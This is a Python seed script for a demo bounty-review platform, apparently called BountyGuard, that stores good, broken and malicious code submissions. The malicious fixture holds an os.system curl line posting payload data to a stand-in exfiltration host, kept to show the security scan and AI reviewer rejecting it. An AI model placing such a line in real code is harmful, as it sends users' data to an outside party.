from decimal import Decimal
import json
import logging
from typing import Any, Dict, Tuple
from sqlalchemy.orm import Session

from app.database import Base, SessionLocal, engine, init_db
from app.models import (
    AuditEventModel,
    BountyModel,
    BountyStatus,
    PayoutModel,
    PayoutStatus,
    ReviewModel,
    ReviewVerdict,
    ReviewerType,
    SubmissionModel,
    SubmissionStatus,
)
from app.services.ai_reviewer import AIReviewer
from app.services.test_runner import FixtureTestRunner

logger = logging.getLogger(__name__)

# --- Scenario Code Diffs ---

GOOD_DIFF = """
class RateLimiter:
    def __init__(self, max_requests: int = 100, window_seconds: int = 60):
        self.max_requests = max_requests
        self.window_seconds = window_seconds
        self.history = {}

    def check_rate_limit(self, client_ip: str) -> bool:
        \"\"\"Validates client request rate against sliding window threshold.\"\"\"
        import time
        now = time.time()
        calls = self.history.get(client_ip, [])
        calls = [t for t in calls if now - t < self.window_seconds]
        if len(calls) >= self.max_requests:
            return False
        calls.append(now)
        self.history[client_ip] = calls
        return True
""".strip()

BROKEN_DIFF = """
class StreamParser:
    def stream_parse(self, chunk: bytes):
        # Broken syntax: missing closing parenthesis and unhandled exception
        if len(chunk == 0:
            return None
""".strip()

MALICIOUS_DIFF = """
class WebhookDispatcher:
    def dispatch(self, target_url: str, payload: dict):
        # Injected exfiltration payload
        import os
        os.system("curl -X POST https://evil-exfiltrator.com/steal --data " + str(payload))
        return {"status": "dispatched"}
""".strip()


def seed_demo_scenarios(db: Session) -> dict[str, Any]:
    """Seeds the three canonical end-to-end scenarios for BountyGuard demonstration."""
    init_db()

    # --- Scenario 1: Good Submission (Approved -> Paid) ---
    bounty_good = BountyModel(
        title="Implement sliding window RateLimiter middleware",
        description="Provide a production-ready RateLimiter class with sliding window check_rate_limit method.",
        amount=Decimal("350.00"),
        currency="USD",
        status=BountyStatus.OPEN.value,
        test_suite_spec=json.dumps({"required_symbols": ["RateLimiter", "check_rate_limit"]}),
    )
    db.add(bounty_good)
    db.commit()
    db.refresh(bounty_good)

    sub_good = SubmissionModel(
        bounty_id=bounty_good.id,
        contributor_email="top_contributor@example.com",
        pr_url="https://github.com/example/repo/pull/101",
        code_diff=GOOD_DIFF,
        commit_sha="a1b2c3d4e5f67890",
        diff_source="preseeded_fixture",
        status=SubmissionStatus.PENDING.value,
        ci_passed=True,
        maintainer_approved=True,
    )
    db.add(sub_good)
    db.commit()
    db.refresh(sub_good)

    rev_good = ReviewModel(
        submission_id=sub_good.id,
        reviewer_type=ReviewerType.AI.value,
        verdict=ReviewVerdict.APPROVED.value,
        score=Decimal("0.96"),
        summary="Gemini 3.8 Flash Code Review: Clean sliding-window rate limiter implementation matching all specification requirements.",
        details=json.dumps({"spec_met": True, "security_clean": True}),
    )
    db.add(rev_good)

    audit_good = AuditEventModel(
        event_type="MAINTAINER_APPROVAL",
        bounty_id=bounty_good.id,
        submission_id=sub_good.id,
        details=json.dumps({"maintainer": "alice@project-core.org", "notes": "LGTM. Verified in staging."}),
    )
    db.add(audit_good)
    db.commit()

    # --- Scenario 2: Broken Submission (Verification Fails -> Payout Blocked) ---
    bounty_broken = BountyModel(
        title="StreamParser buffer management",
        description="Implement stream_parse and cleanup_buffer functions for streaming chunk parsing.",
        amount=Decimal("200.00"),
        currency="USD",
        status=BountyStatus.OPEN.value,
        test_suite_spec=json.dumps({"required_symbols": ["stream_parse", "cleanup_buffer"]}),
    )
    db.add(bounty_broken)
    db.commit()
    db.refresh(bounty_broken)

    sub_broken = SubmissionModel(
        bounty_id=bounty_broken.id,
        contributor_email="novice_dev@example.com",
        pr_url="https://github.com/example/repo/pull/102",
        code_diff=BROKEN_DIFF,
        commit_sha="b2c3d4e5f6a7b8c9",
        diff_source="preseeded_fixture",
        status=SubmissionStatus.REJECTED.value,
        ci_passed=False,
        maintainer_approved=False,
    )
    db.add(sub_broken)
    db.commit()
    db.refresh(sub_broken)

    # Run verification suite to record actual failure
    test_runner = FixtureTestRunner()
    test_res_broken = test_runner.execute_and_update_submission(db, sub_broken.id)

    # --- Scenario 3: Malicious Submission (Static Scan & AI Reject -> Payout Blocked) ---
    bounty_malicious = BountyModel(
        title="Webhook dispatch utility",
        description="Implement dispatch method to send JSON payloads to target webhooks.",
        amount=Decimal("500.00"),
        currency="USD",
        status=BountyStatus.OPEN.value,
        test_suite_spec=json.dumps({"required_symbols": ["WebhookDispatcher", "dispatch"]}),
    )
    db.add(bounty_malicious)
    db.commit()
    db.refresh(bounty_malicious)

    sub_malicious = SubmissionModel(
        bounty_id=bounty_malicious.id,
        contributor_email="adversary@evil.org",
        pr_url="https://github.com/example/repo/pull/103",
        code_diff=MALICIOUS_DIFF,
        commit_sha="deadbeef12345678",
        diff_source="preseeded_fixture",
        status=SubmissionStatus.REJECTED.value,
        ci_passed=False,
        maintainer_approved=False,
    )
    db.add(sub_malicious)
    db.commit()
    db.refresh(sub_malicious)

    # AI reviewer records rejection from static security pre-check
    ai_reviewer = AIReviewer()
    rev_malicious = ai_reviewer.evaluate_and_record_submission(db, sub_malicious.id)

    return {
        "scenario_1_good": {
            "bounty_id": bounty_good.id,
            "submission_id": sub_good.id,
            "status": "ready_for_payout",
        },
        "scenario_2_broken": {
            "bounty_id": bounty_broken.id,
            "submission_id": sub_broken.id,
            "status": "verification_failed",
            "ci_passed": sub_broken.ci_passed,
        },
        "scenario_3_malicious": {
            "bounty_id": bounty_malicious.id,
            "submission_id": sub_malicious.id,
            "status": "security_rejected",
            "verdict": rev_malicious.verdict,
        },
    }


if __name__ == "__main__":
    db = SessionLocal()
    try:
        summary = seed_demo_scenarios(db)
        print("Seeded scenarios successfully:")
        print(json.dumps(summary, indent=2))
    finally:
        db.close()
